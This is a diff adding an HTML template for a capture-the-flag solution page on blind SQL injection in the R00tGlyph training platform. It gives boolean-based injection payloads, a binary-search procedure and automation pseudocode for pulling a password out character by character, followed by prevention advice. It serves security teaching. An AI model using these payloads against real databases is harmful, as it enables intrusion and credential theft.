@@ -1,0 +1,134 @@
+{% extends 'base.html' %}
+
+{% block title %}SQL Injection Level 4 Solution - R00tGlyph{% endblock %}
+
+{% block content %}
+<div class="row">
+    <div class="col-md-8 offset-md-2">
+        <div class="card">
+            <div class="card-header bg-dark text-white">
+                <h2 class="text-center">SQL Injection Level 4 Solution: Blind SQL Injection</h2>
+            </div>
+            <div class="card-body">
+                <div class="alert alert-info">
+                    <h4><i class="bi bi-info-circle-fill me-2"></i>Challenge Overview</h4>
+                    <p>
+                        This challenge demonstrates a blind SQL injection vulnerability in a user profile lookup feature. The application directly concatenates user input into SQL queries without proper sanitization, but doesn't display the query results directly - it only shows whether a user exists or not.
+                    </p>
+                </div>
+                
+                <div class="card mb-4">
+                    <div class="card-header">
+                        <h5><i class="bi bi-bug-fill me-2"></i>Vulnerability Explanation</h5>
+                    </div>
+                    <div class="card-body">
+                        <p>
+                            The vulnerability exists because the application constructs an SQL query by directly concatenating user input:
+                        </p>
+                        <pre class="bg-light p-3 rounded"><code>SELECT * FROM users WHERE id = [user_input]</code></pre>
+                        <p>
+                            This allows an attacker to manipulate the query's structure by injecting SQL code. However, unlike regular SQL injection, the application doesn't display the query results directly - it only shows whether a user exists or not based on the query's result.
+                        </p>
+                        <p>
+                            Blind SQL injection requires extracting information bit by bit by asking yes/no questions through carefully crafted SQL queries.
+                        </p>
+                    </div>
+                </div>
+                
+                <div class="card mb-4">
+                    <div class="card-header">
+                        <h5><i class="bi bi-code-slash me-2"></i>Solution</h5>
+                    </div>
+                    <div class="card-body">
+                        <p>To exploit this vulnerability, we need to:</p>
+                        
+                        <h6>1. Find the admin_secret user's ID</h6>
+                        <p>
+                            First, we need to find the ID of the user with username 'admin_secret'. We can do this by using boolean conditions:
+                        </p>
+                        <div class="alert alert-secondary">
+                            <code>1 AND (SELECT COUNT(*) FROM users WHERE username = 'admin_secret') > 0</code>
+                        </div>
+                        <p>
+                            If this returns "User exists", then we know the admin_secret user exists in the database. Now we need to find their ID:
+                        </p>
+                        <div class="alert alert-secondary">
+                            <code>1 AND (SELECT id FROM users WHERE username = 'admin_secret') = 1</code>
+                        </div>
+                        <p>
+                            We can try different values (1, 2, 3, etc.) until we get a "User exists" response, which tells us the correct ID. Let's assume it's 42.
+                        </p>
+                        
+                        <h6>2. Extract the password character by character</h6>
+                        <p>
+                            Now that we know the ID, we can extract the password (which contains the flag) character by character:
+                        </p>
+                        <div class="alert alert-secondary">
+                            <code>42 AND ASCII(SUBSTRING((SELECT password FROM users WHERE id = 42), 1, 1)) > 97</code>
+                        </div>
+                        <p>
+                            This query checks if the ASCII value of the first character of the password is greater than 97 (the ASCII value for 'a'). By using binary search (trying different values), we can determine the exact ASCII value of each character.
+                        </p>
+                        <p>
+                            For example, to find the first character:
+                        </p>
+                        <ol>
+                            <li>Try ASCII value > 97 (middle of a-z range)</li>
+                            <li>If true, try ASCII value > 110 (middle of n-z range)</li>
+                            <li>If false, try ASCII value > 85 (middle of a-m range)</li>
+                            <li>Continue narrowing down until you find the exact ASCII value</li>
+                            <li>Convert the ASCII value to a character</li>
+                        </ol>
+                        <p>
+                            Repeat this process for each character position until you've extracted the entire password/flag.
+                        </p>
+                        
+                        <h6>3. Automating the process</h6>
+                        <p>
+                            In a real-world scenario, you would use a script to automate this process. Here's a pseudocode example:
+                        </p>
+                        <pre class="bg-light p-3 rounded"><code>password = ""
+for position in range(1, 20):  # Assume password length <= 20
+    for ascii_value in range(32, 127):  # Printable ASCII characters
+        query = f"42 AND ASCII(SUBSTRING((SELECT password FROM users WHERE id = 42), {position}, 1)) = {ascii_value}"
+        if send_query_and_check_if_user_exists(query):
+            password += chr(ascii_value)
+            break
+    if len(password) < position:  # No character found, end of password
+        break
+print("Password:", password)</code></pre>
+                    </div>
+                </div>
+                
+                <div class="card mb-4">
+                    <div class="card-header">
+                        <h5><i class="bi bi-shield-fill-check me-2"></i>Prevention</h5>
+                    </div>
+                    <div class="card-body">
+                        <p>To prevent blind SQL injection vulnerabilities, developers should:</p>
+                        <ol>
+                            <li>
+                                <strong>Use Parameterized Queries:</strong> Instead of concatenating strings, use prepared statements with parameter binding.
+                                <pre class="bg-light p-3 rounded"><code>cursor.execute("SELECT * FROM users WHERE id = ?", (user_id,))</code></pre>
+                            </li>
+                            <li>
+                                <strong>Use an ORM (Object-Relational Mapping):</strong> ORMs like SQLAlchemy handle parameter sanitization automatically.
+                            </li>
+                            <li>
+                                <strong>Implement Proper Error Handling:</strong> Ensure that error messages don't reveal information about the database structure.
+                            </li>
+                            <li>
+                                <strong>Input Validation:</strong> Validate and sanitize all user inputs before using them in queries.
+                            </li>
+                        </ol>
+                    </div>
+                </div>
+                
+                <div class="mt-4">
+                    <a href="{{ url_for('sqli_level4') }}" class="btn btn-primary"><i class="bi bi-arrow-left me-2"></i>Back to Challenge</a>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+{% endblock %}
